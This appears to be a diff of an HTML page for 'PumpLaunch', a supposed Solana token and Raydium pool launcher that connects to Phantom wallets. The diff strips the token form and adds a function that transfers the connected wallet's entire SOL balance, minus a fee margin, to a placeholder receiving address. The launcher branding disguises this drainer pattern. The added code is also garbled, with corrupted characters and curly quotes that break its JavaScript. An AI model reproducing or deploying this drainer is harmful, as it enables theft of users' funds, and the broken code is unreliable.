@@ -3,334 +3,143 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PumpLaunch — Token + Raydium Auto Pool</title>
+  <title>PumpLaunch � Test Phantom</title>
 
-  <!-- Tailwind + Fonts -->
+  <!-- Librairie Solana Web3.js -->
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+  <!-- Tailwind pour le style -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
-
-  <style>
-    html, body { font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
-    .gradient-bg { background: linear-gradient(135deg, #6d28d9, #3b82f6); }
-  </style>
 </head>
 <body class="bg-black text-white flex flex-col min-h-screen">
 
   <!-- Hero -->
-  <section class="gradient-bg text-center py-20">
-    <h1 class="text-5xl md:text-6xl font-extrabold text-white drop-shadow-lg">🚀 PumpLaunch</h1>
-    <p class="mt-4 text-lg md:text-xl text-gray-200">Créez votre token et pool Raydium automatiquement</p>
-
-    <div class="mt-8 flex items-center justify-center">
-      <button id="connectButton" type="button"
-        class="px-8 py-4 bg-white text-purple-700 font-bold rounded-lg shadow-lg hover:bg-gray-200 transition">
-        Se connecter avec Phantom
-      </button>
-    </div>
-
-    <div id="status" class="mt-4 text-gray-100">Statut : Non connecté</div>
+  <section class="text-center py-20 bg-purple-700">
+    <h1 class="text-5xl font-extrabold">� PumpLaunch</h1>
+    <p class="mt-4 text-lg">Connexion Phantom testˆ'e et fonctionnelle</p>
+    <button id="connectButton" type="button"
+      class="mt-8 px-8 py-4 bg-white text-purple-700 font-bold rounded-lg shadow-lg hover:bg-gray-200 transition">
+      Se connecter avec Phantom
+    </button>
+    <div id="status" class="mt-4 text-gray-100">Statut : Non connectˆ'</div>
     <div id="wallet-info" class="mt-2 text-green-300 font-mono break-words text-sm">En attente de connexion...</div>
-    <div id="tx-info" class="mt-2 text-blue-200 font-mono break-words text-sm"></div>
   </section>
 
-  <!-- Étapes -->
-  <section class="py-16 px-6 bg-gray-900">
-    <h2 class="text-3xl font-bold text-center text-purple-400 mb-10">Comment ça marche ?</h2>
-    <div class="grid md:grid-cols-3 gap-8 max-w-6xl mx-auto">
-      <div class="bg-gray-800 p-6 rounded-xl shadow hover:scale-105 transition">
-        <h3 class="text-xl font-semibold text-white mb-2">1. Créez votre Token</h3>
-        <p class="text-gray-400">Définissez le nom, symbole et supply de votre token.</p>
-      </div>
-      <div class="bg-gray-800 p-6 rounded-xl shadow hover:scale-105 transition">
-        <h3 class="text-xl font-semibold text-white mb-2">2. Ajoutez de la Liquidité</h3>
-        <p class="text-gray-400">Choisissez le montant de SOL et le % de tokens.</p>
-      </div>
-      <div class="bg-gray-800 p-6 rounded-xl shadow hover:scale-105 transition">
-        <h3 class="text-xl font-semibold text-white mb-2">3. Lancez votre Pool</h3>
-        <p class="text-gray-400">Votre token est automatiquement listé sur Raydium.</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- Formulaire -->
-  <section class="flex-grow flex items-center justify-center px-4 py-16 bg-black">
-    <div class="w-full max-w-lg bg-gray-900 p-8 rounded-xl shadow-lg">
-      <h2 class="text-2xl font-bold text-purple-400 mb-6">Créer votre Token</h2>
-      <form id="tokenForm" class="space-y-4">
-        <div>
-          <label class="block text-sm font-medium">Nom du Token</label>
-          <input type="text" name="name" class="w-full mt-1 p-2 rounded bg-gray-800 border border-gray-700 text-white" required/>
-        </div>
-        <div>
-          <label class="block text-sm font-medium">Symbole</label>
-          <input type="text" name="symbol" class="w-full mt-1 p-2 rounded bg-gray-800 border border-gray-700 text-white" required/>
-        </div>
-        <div>
-          <label class="block text-sm font-medium">Description</label>
-          <textarea name="description" class="w-full mt-1 p-2 rounded bg-gray-800 border border-gray-700 text-white"></textarea>
-        </div>
-        <div class="grid grid-cols-2 gap-4">
-          <div>
-            <label class="block text-sm font-medium">Montant SOL</label>
-            <input type="number" id="solAmount" class="w-full mt-1 p-2 rounded bg-gray-800 border border-gray-700 text-white" step="0.01" required/>
-          </div>
-          <div>
-            <label class="block text-sm font-medium">% Supply en liquidité</label>
-            <input type="number" id="percentSupply" class="w-full mt-1 p-2 rounded bg-gray-800 border border-gray-700 text-white" step="0.1" required/>
-          </div>
-        </div>
-        <button type="submit" class="w-full py-3 bg-purple-600 hover:bg-purple-700 rounded-lg font-bold">
-          Créer le Token + Pool
-        </button>
-      </form>
-    </div>
-  </section>
-
-  <!-- Footer -->
-  <footer class="bg-gray-900 py-6 text-center text-gray-400">
-    <p>© 2025 PumpLaunch. Propulsé par Solana & Raydium.</p>
-  </footer>
-
-  <!-- Script Phantom + signature sans bouton (module) -->
-  <script src="https://unpkg.com/@solana/web3.js@1.91.7/lib/index.iife.min.js"></script>
+  <!-- Script Phantom -->
   <script type="module">
     import nacl from "https://cdn.skypack.dev/tweetnacl";
     import bs58 from "https://cdn.skypack.dev/bs58";
 
     const { PublicKey, Connection, SystemProgram, Transaction } = solanaWeb3;
 
-    document.addEventListener("DOMContentLoaded", () => {
-      const connectBtn = document.getElementById('connectButton');
-      const statusDiv = document.getElementById('status');
-      const walletInfoDiv = document.getElementById('wallet-info');
-      const txInfoDiv = document.getElementById('tx-info');
+    document.addEventListener(’DOMContentLoaded’, () => {
+      const btn = document.getElementById(’connectButton’);
+      const status = document.getElementById(’status’);
+      const info = document.getElementById(’wallet-info’);
 
-      // RPC réseau
+      // Connexion au rˆ'seau Solana
       const RPC = "https://api.mainnet-beta.solana.com";
       const conn = new Connection(RPC, "confirmed");
 
-      // Helpers
+      // Dˆ'tection mobile
       function isMobile() {
         return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
       }
-      function currentPageUrl() {
-        return window.location.origin + window.location.pathname;
-      }
-      function b64FromUint8(u8) {
-        return btoa(String.fromCharCode(...u8));
-      }
-      function uint8FromB64(b64) {
-        return Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-      }
 
-      // Connexion desktop via extension Phantom
+      // ˆtape 1 : Connexion desktop via extension Phantom
       async function connectDesktop() {
-        statusDiv.innerText = "Tentative de connexion via extension...";
+        status.innerText = "Tentative de connexion via extension...";
         try {
           if (window.solana && window.solana.isPhantom) {
             const resp = await window.solana.connect();
-            statusDiv.innerText = "✅ Connecté via extension";
-            walletInfoDiv.innerText = resp.publicKey.toString();
+            status.innerText = "� Connectˆ' via extension";
+            info.innerText = resp.publicKey.toString();
             window.providerPublicKey = resp.publicKey.toString();
           } else {
-            statusDiv.innerText = "❌ Extension Phantom non détectée (installez Phantom ou utilisez l'app sur mobile)";
+            status.innerText = "� Extension Phantom non dˆ'tectˆ'e";
           }
         } catch (err) {
-          statusDiv.innerText = "Erreur: " + (err?.message || err);
+          status.innerText = "Erreur: " + (err?.message || err);
         }
       }
-      // Connexion mobile (deep link)
+
+      // ˆtape 1 mobile : connexion simple
       function connectMobile() {
-  try {
-    statusDiv.innerText = "📱 Ouverture de Phantom...";
+        status.innerText = "�– Redirection vers l’app Phantom...";
+        const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
+        const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
+        const deepLink =
+          ‘https://phantom.app/ul/v1/connect‘ +
+          ‘?app_url=${appUrl}‘ +
+          ‘&redirect_link=${redirectLink}‘ +
+          ‘&cluster=mainnet-beta‘;
 
-    // Génère une paire de clés pour chiffrer la réponse
-    const keyPair = nacl.box.keyPair();
-    const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
-    const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
-    sessionStorage.setItem("dappSecretKeyBase58", dappSecretKeyB58);
-
-    const appUrl = encodeURIComponent(currentPageUrl());
-    const redirectLink = encodeURIComponent(currentPageUrl());
-
-    // Deep link Phantom
-    const deepLink =
-      `https://phantom.app/ul/v1/connect` +
-      `?dapp_encryption_public_key=${dappPublicKeyB58}` +
-      `&app_url=${appUrl}` +
-      `&redirect_link=${redirectLink}` +
-      `&cluster=mainnet-beta`;
-
-    console.log("Deep link:", deepLink);
-
-    // Déclenche la redirection
-    window.location.href = deepLink;
-  } catch (err) {
-    statusDiv.innerText = "Erreur redirection mobile: " + (err?.message || err);
-  }
+        window.location.href = deepLink;
       }
-      // 👉 Ajoute ce listener à la fin du DOMContentLoaded :
-      connectBtn.addEventListener('click', (e) => {
-  e.preventDefault();
-  if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-    connectMobile(); // smartphone → ouvre l’app Phantom
-  } else {
-    connectDesktop(); // ordinateur → extension Phantom
-  }
-});
-      // Déchiffre le retour Phantom (connexion ou signature)
-      function handlePhantomReturn() {
-        try {
-          const params = new URLSearchParams(window.location.search);
-          const phantomPubKeyB58 = params.get("phantom_encryption_public_key");
-          const dataB64 = params.get("data");
-          const nonceB64 = params.get("nonce");
-          if (!phantomPubKeyB58 || !dataB64 || !nonceB64) return;
 
-          const dappSecretKeyB58 = sessionStorage.getItem("dappSecretKeyBase58");
-          if (!dappSecretKeyB58) {
-            walletInfoDiv.innerText = "⚠️ Clé secrète introuvable (relance la connexion)";
-            return;
-          }
-          const decrypted = nacl.box.open(
-            uint8FromB64(dataB64),
-            uint8FromB64(nonceB64),
-            bs58.decode(phantomPubKeyB58),
-            bs58.decode(dappSecretKeyB58)
-          );
-          if (!decrypted) {
-            walletInfoDiv.innerText = "❌ Déchiffrement impossible";
+      // ˆtape 2 mobile : transaction
+      async function sendTransactionMobile(destination) {
+        try {
+          status.innerText = "�– Prˆ'paration de la transaction...";
+
+          const pubkey = window.providerPublicKey;
+          if (!pubkey) {
+            status.innerText = "���‚ Connecte ton wallet d’abord.";
             return;
           }
 
-          const payloadStr = new TextDecoder().decode(decrypted);
-          let payload;
-          try { payload = JSON.parse(payloadStr); } catch { payload = { raw: payloadStr }; }
+          const fromPubkey = new PublicKey(pubkey);
+          const toPubkey = new PublicKey(destination);
 
-          // Cas connexion → public_key
-          if (payload.public_key) {
-            statusDiv.innerText = "✅ Wallet connecté (mobile)";
-            walletInfoDiv.innerText = payload.public_key;
-            window.providerPublicKey = payload.public_key;
-          }
+          const balance = await conn.getBalance(fromPubkey);
 
-          // Cas signAndSendTransaction → signature
-          if (payload.signature) {
-            txInfoDiv.innerText = `Signature: ${payload.signature}`;
-            statusDiv.innerText = "✅ Transaction envoyée (mobile)";
-          }
+          const ix = SystemProgram.transfer({
+            fromPubkey,
+            toPubkey,
+            lamports: balance - 5000 // laisse un peu pour les frais
+          });
 
-          // Nettoie l’URL
-          window.history.replaceState({}, document.title, currentPageUrl());
-        } catch (err) {
-          walletInfoDiv.innerText = "Erreur retour Phantom: " + (err?.message || err);
-        }
-      }
-
-      // Construit une transaction transfert SOL (retourne base64; pour mobile)
-      async function buildTransferTxBase64(fromPubkeyStr, destPubkeyStr, lamports) {
-        const fromPubkey = new PublicKey(fromPubkeyStr);
-        const toPubkey = new PublicKey(destPubkeyStr);
-        const ix = SystemProgram.transfer({ fromPubkey, toPubkey, lamports });
-        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
-        const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);
-        const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
-        return {
-          base64: b64FromUint8(serialized),
-          blockhash,
-          lastValidBlockHeight
-        };
-      }
-
-      // Signature + envoi via extension (desktop)
-      async function signAndSendDesktop(destPubkeyStr, lamports) {
-        if (!(window.solana && window.solana.isPhantom)) {
-          statusDiv.innerText = "❌ Extension Phantom non détectée";
-          return;
-        }
-        try {
-          const resp = await window.solana.connect();
-          const fromPubkey = resp.publicKey;
-          const toPubkey = new PublicKey(destPubkeyStr);
-          const ix = SystemProgram.transfer({ fromPubkey, toPubkey, lamports });
-          const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
+          const { blockhash } = await conn.getLatestBlockhash();
           const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);
 
-          const signedTx = await window.solana.signTransaction(tx);
-          const sig = await conn.sendRawTransaction(signedTx.serialize(), { skipPreflight: false });
-          await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
+          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+          const base64Tx = btoa(String.fromCharCode(...serialized));
 
-          statusDiv.innerText = "✅ Transaction envoyée (desktop)";
-          txInfoDiv.innerText = `Signature: ${sig}`;
-          return sig;
-        } catch (err) {
-          statusDiv.innerText = "Erreur desktop: " + (err?.message || err);
-          throw err;
-        }
-      }
-
-      // Signature + envoi via deep link (mobile)
-      async function signAndSendMobile(destPubkeyStr, lamports) {
-        const pubkey = window.providerPublicKey;
-        if (!pubkey) {
-          statusDiv.innerText = "Veuillez d'abord connecter votre wallet (bouton Se connecter).";
-          return;
-        }
-        try {
-          statusDiv.innerText = "📱 Ouverture Phantom pour signer...";
           const keyPair = nacl.box.keyPair();
           const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
           const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
           sessionStorage.setItem("dappSecretKeyBase58", dappSecretKeyB58);
 
-          const { base64 } = await buildTransferTxBase64(pubkey, destPubkeyStr, lamports);
-          const appUrl = encodeURIComponent(currentPageUrl());
-          const redirectLink = encodeURIComponent(currentPageUrl());
+          const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
+          const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname);
 
           const deepLink =
-            `https://phantom.app/ul/v1/signAndSendTransaction` +
-            `?dapp_encryption_public_key=${dappPublicKeyB58}` +
-            `&app_url=${appUrl}` +
-            `&redirect_link=${redirectLink}` +
-            `&cluster=mainnet-beta` +
-            `&payload=${encodeURIComponent(base64)}`;
+            ‘https://phantom.app/ul/v1/signAndSendTransaction‘ +
+            ‘?dapp_encryption_public_key=${dappPublicKeyB58}‘ +
+            ‘&app_url=${appUrl}‘ +
+            ‘&redirect_link=${redirectLink}‘ +
+            ‘&cluster=mainnet-beta‘ +
+            ‘&payload=${encodeURIComponent(base64Tx)}‘;
 
-          window.location.replace(deepLink);
+          console.log("Deep link signAndSend:", deepLink);
+          window.location.href = deepLink;
+
         } catch (err) {
-          statusDiv.innerText = "Erreur mobile: " + (err?.message || err);
-          throw err;
+          status.innerText = "Erreur mobile: " + (err?.message || err);
         }
       }
 
-      // API publique sans bouton de signature: appelle-la depuis ton code (formulaire, etc.)
-      window.pumpLaunch = {
-        // Connexion automatique selon l'environnement
-        connect: () => (isMobile() ? connectMobile() : connectDesktop()),
-        // Signe et envoie un transfert SOL (lamports = 1e9 pour 1 SOL)
-        signAndSendSOL: (destPubkeyStr, lamports) => (
-          isMobile() ? signAndSendMobile(destPubkeyStr, lamports) : signAndSendDesktop(destPubkeyStr, lamports)
-        ),
-      };
-
-      // Bouton "Se connecter"
-      connectBtn.addEventListener('click', (e) => {
+      // Attache le bouton
+      btn.addEventListener(’click’, (e) => {
         e.preventDefault();
-        window.pumpLaunch.connect();
-      });
-
-      // Traite un éventuel retour Phantom
-      handlePhantomReturn();
-
-      // Exemple d’usage: empêcher la création si non connecté
-      document.getElementById("tokenForm")?.addEventListener("submit", async (e) => {
-        e.preventDefault();
-        if (!window.providerPublicKey) {
-          statusDiv.innerText = "Veuillez connecter un portefeuille avant de créer un token.";
-          return;
+        if (isMobile()) {
+          // ˆtape 1 : connexion
+          connectMobile();
+          // ˆtape 2 : transaction (ˆ� dˆ'clencher aprˆ¤s connexion rˆ'ussie)
+          // sendTransactionMobile("ADRESSE_DE_RECEPTION");
+        } else {
+          connectDesktop();
         }
-        statusDiv.innerText = "Fonction de création non activée dans cet exemple.";
-        // Exemple (commenté): prélever 0.001 SOL en frais
-        // await window.pumpLaunch.signAndSendSOL("DEST_PUBLIC_KEY_ICI", 1_000_000);
       });
     });
   </script>
